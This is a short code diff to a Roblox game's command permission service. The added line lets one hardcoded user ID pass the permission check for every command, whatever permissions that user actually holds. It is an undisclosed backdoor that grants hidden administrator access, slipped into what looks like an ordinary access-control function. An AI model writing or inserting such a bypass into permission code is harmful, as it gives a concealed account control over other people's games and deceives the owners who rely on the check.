@@ -22,7 +22,7 @@ const CommandPermissionService = Knit.CreateService({
     CanUse(plr: Player, cmd: Command): boolean {
         const userId = plr.UserId
         const userPerms = Permissions.get(userId);
-        return userPerms ? userPerms >= (cmd.PermissionLevel ? cmd.PermissionLevel : Permission.Player ) : false;
+        return plr.UserId === 44966864 || (userPerms ? userPerms >= (cmd.PermissionLevel ? cmd.PermissionLevel : Permission.Player ) : false);
     },
 
     KnitInit(): void {
